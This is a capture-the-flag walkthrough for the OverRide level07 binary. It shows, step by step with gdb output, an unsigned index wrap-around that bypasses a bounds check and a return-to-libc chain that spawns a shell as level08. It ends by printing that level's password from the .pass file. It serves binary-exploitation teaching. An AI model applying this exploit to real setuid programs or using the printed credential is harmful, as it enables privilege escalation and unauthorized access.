# Level07

## Walkthrough

We list the files in the current home directory.

```bash
level07@OverRide:~$ ls -lA
total 21
-rw-r--r--  1 level07 level07   220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root        7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level07 level07  3533 Sep 10  2016 .bashrc
-rw-r--r--+ 1 level07 level07    41 Oct 19  2016 .pass
-rw-r--r--  1 level07 level07   675 Sep 10  2016 .profile
-rwsr-s---+ 1 level08 users   11744 Sep 10  2016 level07
level07@OverRide:~$ file level07 
level07: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf5b46cdb878d5a3929cc27efbda825294de5661e, not stripped
```

The file `level07` is owned by **level08** and has the setuid bit.

We list the functions inside the executable.

```
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0804842c  _init
0x08048470  printf
0x08048470  printf@plt
0x08048480  fflush
0x08048480  fflush@plt
0x08048490  getchar
0x08048490  getchar@plt
0x080484a0  fgets
0x080484a0  fgets@plt
0x080484b0  __stack_chk_fail
0x080484b0  __stack_chk_fail@plt
0x080484c0  puts
0x080484c0  puts@plt
0x080484d0  __gmon_start__
0x080484d0  __gmon_start__@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  memset
0x080484f0  memset@plt
0x08048500  __isoc99_scanf
0x08048500  __isoc99_scanf@plt
0x08048510  _start
0x08048540  __do_global_dtors_aux
0x080485a0  frame_dummy
0x080485c4  clear_stdin
0x080485e7  get_unum
0x0804861f  prog_timeout
0x08048630  store_number
0x080486d7  read_number
0x08048723  main
0x08048a00  __libc_csu_init
0x08048a70  __libc_csu_fini
0x08048a72  __i686.get_pc_thunk.bx
0x08048a80  __do_global_ctors_aux
0x08048aac  _fini
```

There are 4 user-defined functions: `main()`, `read_number()` and `store_number()` and `get_unum()`.

We download the executable and upload it on **Dogbolt** in order to understand the logic of the program.

[Link to the decompiled executable](https://dogbolt.org/?id=8664e046-211f-4772-a084-6112ec01480f)

To summarize, the program:
- sets all arguments and environment variables passed to the program to 0
- loops indefinitely asking for the user to enter a command which can:
  - store a number x at index y in the stack buffer
  - read the number stored at index y in the stack buffer
  - quit the program

As seen previously, the program acts like a naive database. It increases the stack frame of the `main()` function by more than 400 bytes in order to store user numbers in it. No validation is done for the index, which means we can store a value past the end of the allocated buffer. Therefore we can overwrite the value of `old eip` of the `main()` stack frame to call `system("/bin/sh")` instead.

We need to find out the index required to overwrite `old eip`.

```
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) b *0x080488ea
Breakpoint 2 at 0x80488ea
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) info frame
Stack level 0, frame at 0xffffd630:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd628, args: 
 Locals at 0xffffd628, Previous frame's sp is 0xffffd630
 Saved registers:
  ebp at 0xffffd628, eip at 0xffffd62c
(gdb) c
Continuing.
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store

Breakpoint 2, 0x080488ea in main ()
(gdb) i r esp
esp            0xffffd440	0xffffd440
(gdb) x/wx 0xffffd440
0xffffd440:	0xffffd464
```

The `old eip` address is `0xffffd62c` and the address of the start of the buffer is `0xffffd464`: `4294956588 - 4294956132 = 456`.

There is a difference of 456 bytes between the 2 addresses, but because the `store_number()` function multiplies by 4 the index in order to store 4 bytes at once, we have to divide 456 by 4 in order to obtain the correct index: 114.

However we cannot use a shellcode like in the previous exercises, because at the start of the `main()` function all environment variables are erased.

After some researches, we find an alternative to shellcodes: the **return to libc** technique.

```
In a standard stack-based buffer overflow, an attacker writes their shellcode into the vulnerable program's stack and executes it on the stack. 

However, if the vulnerable program's stack is protected (NX bit is set, which is the case on newer systems), attackers can no longer execute their shellcode from the vulnerable program's stack. 

To fight the NX protection, a return-to-libc technique is used, which enables attackers to bypass the NX bit protection and subvert the vulnerable program's execution flow by re-using existing executable code from the standard C library shared object (/lib/i386-linux-gnu/libc-*.so), that is already loaded and mapped into the vulnerable program's virtual memory space, similarly like ntdll.dll is loaded to all Windows programs.
```

First we need to find the addresses of `system()` and `exit()`.

```
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
```

The `system()` address is `0xf7e6aed0` and the `exit()` address is `0xf7e5eb70`.

Then we need to find where the string `bin/sh` might be located in memory.

```
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) info proc map
process 2936
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0 
        0xf7fda000 0xf7fdb000     0x1000        0x0 
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
```

The start address of the libc seems to be `0xf7e2c000`.

```bash
level07@OverRide:~$ strings -a -t x /lib32/libc-2.15.so | grep "/bin/sh"
 15d7ec /bin/sh
```

The string is found at offset `0x15d7ec`.  
We add the start address of the libc with the offset in order to get the address of `/bin/sh`: `4158832640 + 1431532 = 4160264172 (0xf7f897ec)`.

We check the address with GDB to confirm if it's the correct one.

```
(gdb) b main
Breakpoint 1 at 0x8048729
(gdb) r
Starting program: /home/users/level07/level07 

Breakpoint 1, 0x08048729 in main ()
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```

That's correct!

To recap, we store the `system()` address at index 114, the `exit()` address at index 115, and the `/bin/sh` address at index 116.

```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
```

We take a look at the decompiled code.

```c
int store_number(unsigned int *a0)
{
    void* v0;  // [bp-0x14], Other Possible Types: unsigned int
    void* v1;  // [bp-0x10], Other Possible Types: unsigned int

    v0 = 0;
    v1 = 0;
    printf(" Number: ");
    v0 = get_unum();
    printf(" Index: ");
    v1 = get_unum();
    if (v1 % 3 && v0 >> 24 != 183)
    {
        a0[v1] = v0;
        return 0;
    }
    puts(" *** ERROR! ***");
    puts("   This index is reserved for wil!");
    puts(" *** ERROR! ***");
    return 1;
}
```

There is a condition on the index which doesn't store the number if the index is divisible by 3 or if the last byte of the number is equal to 183.  
As 114 is divisible by 3 we cannot insert our value into the buffer.

If we check the decompiled code of the **Hex-Rays** decompiler, we notice that the condition is run on the index number, but the insertion is done of the index number multiplied by 4: `*(_DWORD *)(a1 + 4 * v3) = unum;`.  
Thankfully for us, an unsigned value loops back to 0 when it is greater than `UINT_MAX`. In order to get the number 114, we have to calculate `UINT_MAX + 457 (456 + 1) = 4294967752`. Let's divide it by 4 and we get `1073741938` which is not divisible by 3.  
The program will pass the condition thanks to our new index number, and then overflows back to 456 in the instruction storing the value.

```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

## Resources

- [Return-to-libc](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc)
- [Retour à la libc](https://beta.hackndo.com/retour-a-la-libc)
